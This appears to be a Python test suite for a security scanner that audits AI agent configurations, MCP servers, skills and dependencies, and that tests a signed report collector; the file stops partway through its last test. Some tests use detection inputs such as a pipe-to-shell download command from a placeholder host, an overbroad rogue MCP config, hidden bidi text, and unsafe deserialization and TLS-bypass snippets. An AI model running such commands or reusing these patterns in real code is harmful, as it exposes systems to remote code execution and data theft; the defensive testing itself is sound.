import hashlib, importlib.util, json, os, shutil, sqlite3, subprocess, tempfile, threading, time, unittest, urllib.error, urllib.request, zipfile
from pathlib import Path
from unittest.mock import patch

ROOT=Path(__file__).parents[1]; DOWNLOADS=ROOT/'public'/'downloads'
def load(name,file):
    spec=importlib.util.spec_from_file_location(name,DOWNLOADS/file); module=importlib.util.module_from_spec(spec); spec.loader.exec_module(module); return module

class SentinelTests(unittest.TestCase):
    def setUp(self): self.agent=load('agent','sentinel_agent.py'); self.collector=load('collector','sentinel_collector.py'); self.backup=load('backup','sentinel_collector_backup.py'); self.restore=load('restore','sentinel_collector_restore.py'); self.adapter=load('adapter','sentinel_adapter.py'); self.verifier=load('verifier','sentinel_release_verify.py'); self.policy=json.loads((DOWNLOADS/'sentinel-policy.json').read_text())
    def test_clean_project(self):
        with tempfile.TemporaryDirectory() as d:
            report=self.agent.build_report(Path(d),self.policy)
            self.assertEqual(report['schema'],'sentinel.report/v1'); self.assertEqual(report['summary']['critical'],0)
    def test_scan_and_report_limits_are_enforced(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d)
            for index in range(101): (root/f'{index}.py').write_text('x=1')
            _inventory,findings=self.agent.scan(root,{**self.policy,'limits':{'project_files':100}})
            self.assertIn('project_scan_truncated',{item['kind'] for item in findings})
            fake_inventory=[{'type':'x'}]*5002; fake_findings=[{'kind':'x','severity':'low','path':'p','message':'m'}]*10002
            with patch.object(self.agent,'scan',return_value=(fake_inventory,fake_findings)):
                report=self.agent.build_report(root,self.policy)
            self.assertEqual(len(report['inventory']),5000); self.assertEqual(report['inventory'][-1]['type'],'inventory_truncated')
            self.assertEqual(len(report['findings']),10000); self.assertEqual(report['findings'][-1]['kind'],'findings_truncated')
    def test_oversized_code_config_and_skill_files_are_visible_and_bounded(self):
        policy={**self.policy,'limits':{**self.policy['limits'],'max_file_bytes':65536}}
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); large=root/'app.py'; large.write_bytes(b'x'*65537)
            findings=self.agent.scan(root,policy)[1]; self.assertIn('oversized_file_skipped',{item['kind'] for item in findings})
            skill=root/'demo'; skill.mkdir(); (skill/'SKILL.md').write_text('# demo'); (skill/'large.py').write_bytes(b'x'*65537)
            skill_findings,count=self.agent.scan_skill(skill/'SKILL.md',policy,max_files=2)
            self.assertEqual(count,2); self.assertIn('oversized_file_skipped',{item['kind'] for item in skill_findings})
        self.assertEqual(self.agent.max_file_bytes({'limits':{'max_file_bytes':'bad'}}),1000000)
        self.assertEqual(self.agent.max_file_bytes({'limits':{'max_file_bytes':1}}),65536)
        windows=(DOWNLOADS/'sentinel-windows.ps1').read_text(); self.assertIn("kind='oversized_file_skipped'",windows); self.assertIn('$maxFileBytes',windows)
    def test_secret_detection_is_redacted(self):
        with tempfile.TemporaryDirectory() as d:
            p=Path(d)/'app.py'; p.write_text('token="sk-abcdefghijklmnopqrstuvwxyz123456"')
            report=self.agent.build_report(Path(d),self.policy); f=next(x for x in report['findings'] if x['kind']=='hardcoded_secret')
            self.assertEqual(f['severity'],'critical'); self.assertTrue(f['evidence'].endswith('…')); self.assertNotIn('abcdefghijklmnopqrstuvwxyz',f['evidence'])
    def test_baseline_is_additive_and_idempotent(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); (root/'AGENTS.md').write_text('# Existing\nkeep me')
            self.agent.install_baseline(root); self.agent.install_baseline(root)
            text=(root/'AGENTS.md').read_text(); self.assertIn('keep me',text); self.assertEqual(text.count(self.agent.MANAGED_MARKER),1); self.assertTrue((root/'.cursor/rules/sentinel-security.mdc').exists())
    def test_baseline_write_rejects_symlink_escape(self):
        with tempfile.TemporaryDirectory() as d:
            base=Path(d); root=base/'repo'; outside=base/'outside'; root.mkdir(); outside.mkdir(); (root/'.sentinel').symlink_to(outside, target_is_directory=True)
            victim=outside/'SECURITY_BASELINE.md'; victim.write_text('do not change')
            self.agent.install_baseline(root)
            self.assertEqual(victim.read_text(),'do not change')
            user=base/'user'; user.mkdir(); (user/'.codex').symlink_to(outside,target_is_directory=True); agents=outside/'AGENTS.md'; agents.write_text('personal')
            self.assertEqual(self.agent.install_user_baselines([user]),[]); self.assertEqual(agents.read_text(),'personal')
    def test_user_baseline_loads_only_for_installed_agents_and_updates_in_place(self):
        with tempfile.TemporaryDirectory() as d:
            base=Path(d); active=base/'active'; untouched=base/'untouched'; (active/'.codex').mkdir(parents=True); untouched.mkdir()
            target=active/'.codex/AGENTS.md'; target.write_text('# Personal rules\n')
            first=self.agent.install_user_baselines([active,untouched]); second=self.agent.install_user_baselines([active,untouched])
            text=target.read_text(); self.assertEqual(first,[str(target)]); self.assertEqual(second,[])
            self.assertIn('Personal rules',text); self.assertEqual(text.count(self.agent.USER_BASELINE_START),1); self.assertFalse((untouched/'.codex').exists())
        remediation=(DOWNLOADS/'intune-windows-remediate.ps1').read_text()
        self.assertIn('sentinel-managed-user-baseline:start',remediation); self.assertIn('Test-Path $codexDir',remediation); self.assertIn('ReparsePoint',remediation)
    def test_uninstall_removes_only_managed_user_blocks(self):
        mac=(DOWNLOADS/'uninstall-sentinel-macos.sh').read_text(); windows=(DOWNLOADS/'uninstall-sentinel-windows.ps1').read_text()
        for script in (mac,windows): self.assertIn('sentinel-managed-user-baseline:start',script); self.assertIn('sentinel-managed-user-baseline:end',script)
        self.assertIn('[ ! -L "$file" ]',mac); self.assertIn('ReparsePoint',windows)
        self.assertIn('Repository rule files',mac); self.assertIn('Repository rule files',windows)
    def test_collector_contract(self):
        now=int(time.time()); report={'schema':'sentinel.report/v1','agent_version':'0.11.0','policy_version':'4.2.0','device_id':'device-123','scanned_at':now,'summary':{'critical':0,'high':0,'medium':0,'low':0},'findings':[]}
        self.assertTrue(self.collector.valid_report(report,now)); self.assertFalse(self.collector.valid_report({'schema':'other'},now))
        stale={**report,'scanned_at':now-8*86400}; self.assertFalse(self.collector.valid_report(stale,now))
        inconsistent={**report,'findings':[{'kind':'x','severity':'high','path':'x','message':'x'}]}; self.assertFalse(self.collector.valid_report(inconsistent,now))
        extra={**report,'unexpected':True}; self.assertFalse(self.collector.valid_report(extra,now))
        invalid_inventory={**report,'inventory':['not-an-object']}; self.assertFalse(self.collector.valid_report(invalid_inventory,now))
        oversized_inventory={**report,'inventory':[{}]*5001}; self.assertFalse(self.collector.valid_report(oversized_inventory,now))
        oversized_version={**report,'agent_version':'x'*65}; self.assertFalse(self.collector.valid_report(oversized_version,now))
        oversized_finding={**report,'summary':{'critical':0,'high':1,'medium':0,'low':0},'findings':[{'kind':'x','severity':'high','path':'p','message':'x'*2049}]}; self.assertFalse(self.collector.valid_report(oversized_finding,now))
        schema=json.loads((DOWNLOADS/'sentinel-report.schema.json').read_text())
        self.assertEqual(schema['properties']['inventory']['maxItems'],5000); self.assertEqual(schema['properties']['findings']['maxItems'],10000)
        self.assertFalse(schema['properties']['findings']['items']['additionalProperties'])
    def test_collector_database_deduplication_support(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'reports.db'
            with self.collector.db_open(path) as db:
                first=db.execute("INSERT OR IGNORE INTO reports(report_hash,device_id,received_at,severity,body) VALUES(?,?,?,?,?)",('abc','device-123',1,'normal','{}'))
                second=db.execute("INSERT OR IGNORE INTO reports(report_hash,device_id,received_at,severity,body) VALUES(?,?,?,?,?)",('abc','device-123',1,'normal','{}'))
                self.assertEqual(first.rowcount,1); self.assertEqual(second.rowcount,0)
    def test_collector_audit_is_structured_bounded_and_contains_no_report_body(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'reports.db'; report={'device_id':'device-a','summary':{'critical':0,'high':1}}; secret_body=b'{"sensitive_path":"/Users/alice/private"}'
            self.collector.store_report(path,secret_body,report,now=100)
            self.collector.store_report(path,secret_body,report,now=101)
            events=self.collector.recent_audit(path)
            self.assertEqual([event['event'] for event in events],['report_duplicate','report_accepted'])
            self.assertNotIn('sensitive_path',json.dumps(events)); self.assertNotIn('/Users/alice',json.dumps(events))
            with self.collector.db_open(path) as db:
                for index in range(1005): db.execute("INSERT INTO audit_events(event,occurred_at) VALUES(?,?)",('test',200+index))
                self.collector.prune_audit(db,now=2000,days=90,max_events=1000); db.commit()
                self.assertEqual(db.execute("SELECT COUNT(*) FROM audit_events").fetchone()[0],1000)
        self.assertEqual(self.collector.audit_retention_days('bad'),90); self.assertEqual(self.collector.audit_max_events(5),1000)
    def test_collector_semantic_deduplication_ignores_json_formatting(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'reports.db'; report={'schema':'sentinel.report/v1','agent_version':'0.11.0','policy_version':'4.2.0','device_id':'device-123','scanned_at':1,'summary':{'critical':0,'high':0,'medium':0,'low':0},'findings':[]}
            compact=json.dumps(report,separators=(',',':')).encode(); pretty=json.dumps(report,indent=2,sort_keys=True).encode()
            self.assertFalse(self.collector.store_report(path,compact,report,now=1)['duplicate'])
            self.assertTrue(self.collector.store_report(path,pretty,report,now=1)['duplicate'])
    def test_collector_retention_and_storage(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'reports.db'; now=10*86400
            with self.collector.db_open(path) as db: db.execute("INSERT INTO reports(report_hash,device_id,received_at,severity,body) VALUES(?,?,?,?,?)",('old','device-old',1,'normal','{}')); db.commit()
            report={'device_id':'device-new','summary':{'critical':0,'high':0}}; body=b'{"new":true}'
            result=self.collector.store_report(path,body,report,now=now,days=2); self.assertFalse(result['duplicate'])
            with self.collector.db_open(path) as db: self.assertEqual(db.execute("SELECT COUNT(*) FROM reports").fetchone()[0],1)
        self.assertEqual(self.collector.retention_days('invalid'),30); self.assertEqual(self.collector.retention_days(99999),3650)
    def test_collector_summary_uses_latest_report_per_device(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'reports.db'; now=200000
            with self.collector.db_open(path) as db:
                rows=[('a1','device-a',now-90000,'critical','{}'),('a2','device-a',now-10,'normal','{}'),('b1','device-b',now-20,'high','{}'),('c1','device-c',now-90000,'critical','{}')]
                db.executemany("INSERT INTO reports(report_hash,device_id,received_at,severity,body) VALUES(?,?,?,?,?)",rows); db.commit()
            summary=self.collector.collector_summary(path,now=now)
            self.assertEqual(summary['total_devices'],3); self.assertEqual(summary['active_devices'],2); self.assertEqual(summary['stale_devices'],1)
            self.assertEqual(summary['latest_severity'],{'critical':1,'high':1,'normal':1})
    def test_collector_online_backup_is_consistent_private_and_retained(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); source=root/'sentinel.db'; output=root/'backups'
            with self.collector.db_open(source) as db:
                db.execute("INSERT INTO reports(report_hash,device_id,received_at,severity,body) VALUES(?,?,?,?,?)",('one','device-a',1,'normal','{}')); db.commit()
            first=self.backup.backup_database(source,output,keep=1,now=1)
            self.assertTrue(self.backup.quick_check(first)); self.assertEqual(first.stat().st_mode & 0o777,0o600)
            second=self.backup.backup_database(source,output,keep=1,now=2)
            self.assertTrue(second.exists()); self.assertFalse(first.exists()); self.assertEqual(len(list(output.glob('sentinel-backup-*.sqlite'))),1)
            db=sqlite3.connect(second)
            try: self.assertEqual(db.execute("SELECT COUNT(*) FROM reports").fetchone()[0],1)
            finally: db.close()
        self.assertEqual(self.backup.keep_count('invalid'),14); self.assertEqual(self.backup.keep_count(999),365)
    def test_collector_restore_candidate_is_verified_private_and_non_overwriting(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); source=root/'sentinel.db'; backups=root/'backups'; restored=root/'restore/candidate.db'
            with self.collector.db_open(source) as db:
                db.execute("INSERT INTO reports(report_hash,device_id,received_at,severity,body) VALUES(?,?,?,?,?)",('one','device-a',1,'high','{}')); db.commit()
            backup=self.backup.backup_database(source,backups)
            candidate=self.restore.restore_candidate(backup,restored)
            self.assertTrue(self.backup.quick_check(candidate)); self.assertEqual(candidate.stat().st_mode & 0o777,0o600)
            db=sqlite3.connect(candidate)
            try: self.assertEqual(db.execute("SELECT device_id,severity FROM reports").fetchone(),('device-a','high'))
            finally: db.close()
            with self.assertRaises(FileExistsError): self.restore.restore_candidate(backup,restored)
    def test_collector_rate_limiter_is_bounded_and_recovers(self):
        now=[100.0]; limiter=self.collector.RateLimiter(limit=2,window=60,max_sources=2,clock=lambda:now[0])
        self.assertEqual(limiter.check('client-a'),(True,0)); self.assertEqual(limiter.check('client-a'),(True,0))
        allowed,retry=limiter.check('client-a'); self.assertFalse(allowed); self.assertEqual(retry,60)
        limiter.check('client-b'); limiter.check('client-c'); self.assertLessEqual(len(limiter.events),2)
        now[0]=161; self.assertEqual(limiter.check('client-a'),(True,0))
        self.assertEqual(self.collector.requests_per_minute('invalid'),120); self.assertEqual(self.collector.requests_per_minute(99999),10000)
    def test_collector_http_rate_limit_contract(self):
        with tempfile.TemporaryDirectory() as d, patch.dict(os.environ,{'SENTINEL_COLLECTOR_TOKEN':'bearer'}):
            server=self.collector.ThreadingHTTPServer(('127.0.0.1',0),self.collector.Handler); server.db_path=str(Path(d)/'reports.db'); server.rate_limiter=self.collector.RateLimiter(limit=1)
            thread=threading.Thread(target=server.serve_forever,daemon=True); thread.start()
            try:
                url=f'http://127.0.0.1:{server.server_port}/v1/devices'; request=urllib.request.Request(url,headers={'Authorization':'Bearer bearer'})
                with urllib.request.urlopen(request,timeout=3) as response: self.assertEqual(response.status,200)
                with self.assertRaises(urllib.error.HTTPError) as error: urllib.request.urlopen(request,timeout=3)
                self.assertEqual(error.exception.code,429); self.assertTrue(error.exception.headers['Retry-After']); error.exception.close()
            finally: server.shutdown(); server.server_close(); thread.join(timeout=3)
    def test_signed_report_request_contract(self):
        body=b'{"device":"test"}'; headers=self.agent.report_headers(body,'bearer','signing-secret',now=1000)
        self.assertTrue(self.collector.valid_signature(headers,body,now=1001,secret='signing-secret'))
        self.assertFalse(self.collector.valid_signature(headers,body+b'x',now=1001,secret='signing-secret'))
        self.assertFalse(self.collector.valid_signature(headers,body,now=1301,secret='signing-secret'))
        self.assertEqual(headers['Authorization'],'Bearer bearer'); self.assertTrue(headers['X-Sentinel-Signature'].startswith('sha256='))
    def test_collector_supports_bounded_token_and_signing_key_rotation(self):
        body=b'{"device":"test"}'; old=self.agent.report_headers(body,'old-token','old-signing',now=1000); new=self.agent.report_headers(body,'new-token','new-signing',now=1000)
        env={'SENTINEL_REPORT_SIGNING_SECRETS':'["new-signing","old-signing"]'}
        with patch.dict(os.environ,env,clear=True):
            self.assertTrue(self.collector.valid_signature(old,body,now=1000)); self.assertTrue(self.collector.valid_signature(new,body,now=1000))
        self.assertEqual(self.collector.secret_values('ONE','MANY',{'ONE':'legacy'}),['legacy'])
        self.assertEqual(self.collector.secret_values('ONE','MANY',{'MANY':'["new","old"]'}),['new','old'])
        self.assertEqual(self.collector.secret_values('ONE','MANY',{'MANY':'not-json'}),[])
        self.assertEqual(self.collector.secret_values('ONE','MANY',{'MANY':json.dumps(['x']*6)}),[])
        handler=object.__new__(self.collector.Handler); handler.headers={'Authorization':'Bearer old-token'}
        with patch.dict(os.environ,{'SENTINEL_COLLECTOR_TOKENS':'["new-token","old-token"]'},clear=True): self.assertTrue(handler.authorized())
    def test_collector_runtime_secrets_require_strength_uniqueness_and_separation(self):
        good={'SENTINEL_COLLECTOR_TOKENS':json.dumps(['t'*32,'u'*32]),'SENTINEL_REPORT_SIGNING_SECRETS':json.dumps(['s'*32,'v'*32])}
        self.assertEqual(self.collector.runtime_secret_errors(good),[])
        weak={'SENTINEL_COLLECTOR_TOKEN':'short','SENTINEL_REPORT_SIGNING_SECRET':'tiny'}
        self.assertTrue({'collector_token_too_short','signing_secret_too_short'}.issubset(self.collector.runtime_secret_errors(weak)))
        reused={'SENTINEL_COLLECTOR_TOKEN':'x'*32,'SENTINEL_REPORT_SIGNING_SECRET':'x'*32}
        self.assertIn('authentication_and_signing_secret_reused',self.collector.runtime_secret_errors(reused))
        duplicate={'SENTINEL_COLLECTOR_TOKENS':json.dumps(['a'*32,'a'*32]),'SENTINEL_REPORT_SIGNING_SECRET':'b'*32}
        self.assertIn('collector_token_duplicate',self.collector.runtime_secret_errors(duplicate))
        pilot={'SENTINEL_COLLECTOR_TOKEN':'a'*32,'SENTINEL_ALLOW_UNSIGNED_REPORTS':'true'}
        self.assertEqual(self.collector.runtime_secret_errors(pilot),[])
    def test_unsigned_reports_are_denied_unless_explicitly_enabled(self):
        with patch.dict(os.environ,{},clear=True): self.assertFalse(self.collector.valid_signature({},b'body',now=1,secret=''))
        with patch.dict(os.environ,{'SENTINEL_ALLOW_UNSIGNED_REPORTS':'true'},clear=True): self.assertTrue(self.collector.valid_signature({},b'body',now=1,secret=''))
        self.assertFalse(self.collector.allow_unsigned_reports('false')); self.assertTrue(self.collector.allow_unsigned_reports('yes'))
    def test_collector_http_accepts_signed_report_and_deduplicates(self):
        with tempfile.TemporaryDirectory() as d, patch.dict(os.environ,{'SENTINEL_COLLECTOR_TOKEN':'bearer','SENTINEL_REPORT_SIGNING_SECRET':'signing-secret'}):
            server=self.collector.ThreadingHTTPServer(('127.0.0.1',0),self.collector.Handler); server.db_path=str(Path(d)/'reports.db')
            thread=threading.Thread(target=server.serve_forever,daemon=True); thread.start()
            try:
                now=int(time.time()); report={'schema':'sentinel.report/v1','agent_version':'0.11.0','policy_version':'4.2.0','device_id':'device-http','scanned_at':now,'summary':{'critical':0,'high':0,'medium':0,'low':0},'findings':[]}; body=json.dumps(report).encode()
                headers=self.agent.report_headers(body,'bearer','signing-secret',now=now); request=urllib.request.Request(f'http://127.0.0.1:{server.server_port}/v1/reports',data=body,headers=headers,method='POST')
                with urllib.request.urlopen(request,timeout=3) as response: self.assertEqual(response.status,202); self.assertFalse(json.load(response)['duplicate'])
                request=urllib.request.Request(f'http://127.0.0.1:{server.server_port}/v1/reports',data=body,headers=headers,method='POST')
                with urllib.request.urlopen(request,timeout=3) as response: self.assertEqual(response.status,200); self.assertTrue(json.load(response)['duplicate'])
                tampered=body+b' '; request=urllib.request.Request(f'http://127.0.0.1:{server.server_port}/v1/reports',data=tampered,headers=headers,method='POST')
                with self.assertRaises(urllib.error.HTTPError) as error: urllib.request.urlopen(request,timeout=3)
                self.assertEqual(error.exception.code,401); error.exception.close()
                summary_request=urllib.request.Request(f'http://127.0.0.1:{server.server_port}/v1/summary',headers={'Authorization':'Bearer bearer'})
                with urllib.request.urlopen(summary_request,timeout=3) as response:
                    summary=json.load(response); self.assertEqual(summary['total_devices'],1); self.assertEqual(summary['active_devices'],1)
                audit_request=urllib.request.Request(f'http://127.0.0.1:{server.server_port}/v1/audit',headers={'Authorization':'Bearer bearer'})
                with urllib.request.urlopen(audit_request,timeout=3) as response:
                    events=json.load(response)['events']; self.assertIn('audit_read',{event['event'] for event in events}); self.assertIn('report_accepted',{event['event'] for event in events})
            finally: server.shutdown(); server.server_close(); thread.join(timeout=3)
    def test_mcp_least_privilege(self):
        config={'mcpServers':{'rogue':{'command':'bash','args':['/'],'env':{'API_KEY':'literal-secret'},'url':'http://outside.invalid'}}}
        findings=self.agent.scan_mcp_config(Path('/tmp/mcp.json'),json.dumps(config),self.policy)
        kinds={f['kind'] for f in findings}
        self.assertTrue({'unknown_mcp','unapproved_mcp_command','broad_filesystem_scope','literal_mcp_secret','insecure_mcp_transport'}.issubset(kinds))
        secret=next(f for f in findings if f['kind']=='literal_mcp_secret'); self.assertEqual(secret['evidence'],'[REDACTED]')
    def test_codex_toml_mcp_least_privilege(self):
        text='''[mcp_servers.rogue]\ncommand = "bash"\nargs = ["/"]\nurl = "http://outside.invalid"\n[mcp_servers.rogue.env]\nAPI_TOKEN = "literal-value"\n'''
        findings=self.agent.scan_mcp_config(Path('/tmp/config.toml'),text,self.policy); kinds={f['kind'] for f in findings}
        self.assertTrue({'unknown_mcp','unapproved_mcp_command','broad_filesystem_scope','insecure_mcp_transport','literal_mcp_secret'}.issubset(kinds))
        self.assertEqual(next(f for f in findings if f['kind']=='literal_mcp_secret')['evidence'],'[REDACTED]')
    def test_remote_mcp_is_default_deny_and_credentials_are_redacted(self):
        cfg={'mcpServers':{'github':{'url':'https://user:pass@trusted.example/mcp?token=secret'}}}
        findings=self.agent.scan_mcp_config(Path('/tmp/mcp.json'),json.dumps(cfg),self.policy); kinds={f['kind'] for f in findings}
        self.assertIn('unapproved_mcp_domain',kinds); self.assertIn('mcp_url_credentials',kinds)
        self.assertEqual(next(f for f in findings if f['kind']=='mcp_url_credentials')['evidence'],'[REDACTED]')
    def test_remote_mcp_requires_exact_approved_hostname(self):
        policy={**self.policy,'allowed_mcp_domains':['trusted.example']}
        good=self.agent.scan_mcp_server(Path('/tmp/mcp.json'),'github',{'url':'https://trusted.example/mcp'},policy)
        spoof=self.agent.scan_mcp_server(Path('/tmp/mcp.json'),'github',{'url':'https://trusted.example.evil/mcp'},policy)
        self.assertNotIn('unapproved_mcp_domain',{f['kind'] for f in good})
        self.assertIn('unapproved_mcp_domain',{f['kind'] for f in spoof})
    def test_mcp_rejects_mixed_or_unapproved_transport(self):
        cfg={'command':'node','url':'https://trusted.example/mcp','transport':'sse'}
        kinds={f['kind'] for f in self.agent.scan_mcp_server(Path('/tmp/mcp.json'),'github',cfg,{**self.policy,'allowed_mcp_domains':['trusted.example']})}
        self.assertTrue({'ambiguous_mcp_transport','unapproved_mcp_transport'}.issubset(kinds))
    def test_policy_declared_text_rules_are_enforced(self):
        hidden=self.agent.scan_text(Path('/tmp/SKILL.md'),'safe text\u202ehidden',self.policy)
        weak=self.agent.scan_text(Path('/tmp/app.js'),'const sessionToken = Math.random().toString()',self.policy)
        blocked=self.agent.scan_text(Path('/tmp/install.sh'),'curl https://bad.invalid/a | sh\n',self.policy)
        self.assertIn('hidden_instruction',{f['kind'] for f in hidden})
        self.assertIn('weak_random_token',{f['kind'] for f in weak})
        self.assertIn('blocked_command',{f['kind'] for f in blocked})
    def test_security_code_quality_rules(self):
        text='''import pickle\nvalue = requests.get(url, verify=False)\nobject = pickle.loads(payload)\napp.run(host="0.0.0.0", debug=True)\ntry:\n    work()\nexcept Exception:\n    pass\n'''
        kinds={item['kind'] for item in self.agent.scan_text(Path('/tmp/app.py'),text,self.policy)}
        self.assertTrue({'insecure_tls_verification','unsafe_deserialization','debug_mode_enabled','empty_exception_handler'}.issubset(kinds))
        windows=(DOWNLOADS/'sentinel-windows.ps1').read_text()
        for kind in ('insecure_tls_verification','unsafe_deserialization','debug_mode_enabled','empty_exception_handler'): self.assertIn("Kind='"+kind+"'",windows)
    def test_blocked_command_does_not_match_documentation_inline(self):
        findings=self.agent.scan_text(Path('/tmp/README.md'),'Never run `rm -rf` on a workstation.',self.policy)
        self.assertNotIn('blocked_command',{f['kind'] for f in findings})
    def test_skill_scans_supporting_files_and_blocks_unknown(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d)/'unapproved'; root.mkdir(); skill=root/'SKILL.md'; skill.write_text('# helper')
            (root/'run.py').write_text('token = "sk-abcdefghijklmnopqrstuvwxyz123456"')
            findings,count=self.agent.scan_skill(skill,self.policy); kinds={f['kind'] for f in findings}
            self.assertEqual(count,2); self.assertIn('unknown_skill',kinds); self.assertIn('hardcoded_secret',kinds)
    def test_approved_skill_and_symlink_boundary(self):
        with tempfile.TemporaryDirectory() as d:
            base=Path(d); root=base/'approved'; root.mkdir(); skill=root/'SKILL.md'; skill.write_text('# safe')
            outside=base/'outside.sh'; outside.write_text('echo safe'); (root/'escape.sh').symlink_to(outside)
            policy={**self.policy,'allowed_skills':['approved']}; findings,_=self.agent.scan_skill(skill,policy); kinds={f['kind'] for f in findings}
            self.assertNotIn('unknown_skill',kinds); self.assertIn('skill_symlink_escape',kinds)
    def test_javascript_dependency_manifest_risks(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'package.json'; path.write_text(json.dumps({'dependencies':{'safe':'1.2.3','floating':'^2.0.0','remote':'git+https://example.invalid/repo.git'}}))
            findings=self.agent.scan_dependency_manifest(path,path.read_text()); kinds={f['kind'] for f in findings}
            self.assertTrue({'dependency_unpinned','dependency_untrusted_source','missing_lockfile'}.issubset(kinds))
    def test_dependency_lock_and_exact_versions_pass(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); (root/'package-lock.json').write_text('{}'); path=root/'package.json'; path.write_text(json.dumps({'dependencies':{'safe':'1.2.3'}}))
            self.assertEqual(self.agent.scan_dependency_manifest(path,path.read_text()),[])
            requirements=root/'requirements.txt'; requirements.write_text('requests==2.32.4\n')
            self.assertEqual(self.agent.scan_dependency_manifest(requirements,requirements.read_text()),[])
    def test_endpoint_integrity_manifest_covers_all_runtime_inputs(self):
        entries={line.split()[1]:line.split()[0] for line in (DOWNLOADS/'CHECKSUMS.sha256').read_text().splitlines()}
        for name in ('sentinel_agent.py','sentinel-windows.ps1','sentinel-policy.json','sentinel-security-baseline.md'):
            digest=hashlib.sha256((DOWNLOADS/name).read_bytes()).hexdigest(); self.assertEqual(entries.get(name),digest)
        self.assertTrue((DOWNLOADS/'rollback-sentinel-windows.ps1').exists()); self.assertTrue((DOWNLOADS/'rollback-sentinel-macos.sh').exists())
        self.assertIn("agent_version='0.17.0'",(DOWNLOADS/'sentinel-windows.ps1').read_text())
        self.assertEqual(self.agent.report_headers(b'{}')['User-Agent'],'SentinelAgent/0.17.0')
    def test_posix_installer_creates_only_complete_previous_snapshots(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); install=root/'install'; source=DOWNLOADS.resolve(); env={**os.environ,'SENTINEL_INSTALL_DIR':str(install),'SENTINEL_BASE_URL':source.as_uri()}
            script=str(DOWNLOADS/'install-sentinel.sh')
            subprocess.run(['/bin/sh',script],env=env,check=True,capture_output=True,text=True)
            for name in ('sentinel_agent.py','sentinel-policy.json','sentinel-security-baseline.md'): (install/name).write_text('previous-'+name)
            subprocess.run(['/bin/sh',script],env=env,check=True,capture_output=True,text=True)
            previous=install/'previous'; self.assertTrue((previous/'CHECKSUMS.sha256').exists())
            for name in ('sentinel_agent.py','sentinel-policy.json','sentinel-security-baseline.md'): self.assertEqual((previous/name).read_text(),'previous-'+name)
            snapshot={name:(previous/name).read_bytes() for name in ('sentinel_agent.py','sentinel-policy.json','sentinel-security-baseline.md','CHECKSUMS.sha256')}
            (install/'sentinel-policy.json').unlink()
            subprocess.run(['/bin/sh',script],env=env,check=True,capture_output=True,text=True)
            self.assertEqual(snapshot,{name:(previous/name).read_bytes() for name in snapshot})
        windows=(DOWNLOADS/'intune-windows-remediate.ps1').read_text(); mac=(DOWNLOADS/'intune-macos-install.sh').read_text()
        self.assertIn("'.previous-stage-'",windows); self.assertIn('$currentComplete',windows); self.assertIn('.previous-stage.$$',mac); self.assertIn('CURRENT_COMPLETE',mac)
    def test_installers_bound_each_network_download(self):
        generic=(DOWNLOADS/'install-sentinel.sh').read_text(); mac=(DOWNLOADS/'intune-macos-install.sh').read_text(); windows=(DOWNLOADS/'intune-windows-remediate.ps1').read_text()
        for script in (generic,mac):
            self.assertIn('--connect-timeout 15',script); self.assertIn('--max-time 120',script); self.assertIn('shasum -a 256 -c -',script)
        self.assertIn('-TimeoutSec 120',windows); self.assertIn('Get-FileHash',windows)
        self.assertLess(windows.index('-TimeoutSec 120'),windows.index('Get-FileHash'))
    def test_release_verifier_accepts_published_bundle(self):
        self.assertEqual(self.verifier.verify(DOWNLOADS),[])
    def test_release_verifier_rejects_runtime_drift(self):
        with tempfile.TemporaryDirectory() as d:
            copy=Path(d)/'downloads'; shutil.copytree(DOWNLOADS,copy); (copy/'sentinel_agent.py').write_text('# drift')
            errors=self.verifier.verify(copy)
            self.assertIn('checksum_mismatch:sentinel_agent.py',errors); self.assertIn('bundle_content_mismatch:sentinel_agent.py',errors)
    def test_intune_compliance_checks_integrity_task_and_policy(self):
        manifest={line.split()[1]:line.split()[0] for line in (DOWNLOADS/'CHECKSUMS.sha256').read_text().splitlines()}
        discovery=(DOWNLOADS/'intune-compliance-discovery.ps1').read_text(); detection=(DOWNLOADS/'intune-windows-detect.ps1').read_text()
        for name in ('sentinel-windows.ps1','sentinel-policy.json','sentinel-security-baseline.md'):
            self.assertIn(manifest[name],discovery); self.assertIn(manifest[name],detection)
        rules=json.loads((DOWNLOADS/'intune-compliance-policy.json').read_text())['Rules']; names={x['SettingName'] for x in rules}
        self.assertTrue({'SentinelIntegrityValid','SentinelScheduledTaskHealthy','SentinelPolicyVersion','SentinelScanRecent'}.issubset(names))
        version=next(x['Operand'] for x in rules if x['SettingName']=='SentinelPolicyVersion'); self.assertEqual(version,self.policy['version'])
        self.assertTrue(all('en_US' in {s['Language'] for s in rule['RemediationStrings']} for rule in rules))
    def test_intune_macos_compliance_contract(self):
        manifest={line.split()[1]:line.split()[0] for line in (DOWNLOADS/'CHECKSUMS.sha256').read_text().splitlines()}
        discovery=(DOWNLOADS/'intune-macos-compliance.sh').read_text(); rules=json.loads((DOWNLOADS/'intune-macos-compliance-policy.json').read_text())['Rules']
        for name in ('sentinel_agent.py','sentinel-policy.json','sentinel-security-baseline.md'): self.assertIn(manifest[name],discovery)
        names={rule['SettingName'] for rule in rules}; self.assertTrue({'SentinelInstalled','SentinelIntegrityValid','SentinelLaunchDaemonHealthy','SentinelPolicyVersion','SentinelScanRecent','SentinelCriticalFindings','SentinelHighFindings'}.issubset(names))
        self.assertTrue(all('en_US' in {s['Language'] for s in rule['RemediationStrings']} for rule in rules))
        version=next(rule['Operand'] for rule in rules if rule['SettingName']=='SentinelPolicyVersion'); self.assertEqual(version,self.policy['version'])
        with zipfile.ZipFile(DOWNLOADS/'sentinel-enterprise-bundle.zip') as bundle:
            self.assertTrue({'intune-macos-compliance.sh','intune-macos-compliance-policy.json'}.issubset(bundle.namelist()))
    def test_windows_scanner_covers_codex_toml_mcp_contract(self):
        script=(DOWNLOADS/'sentinel-windows.ps1').read_text()
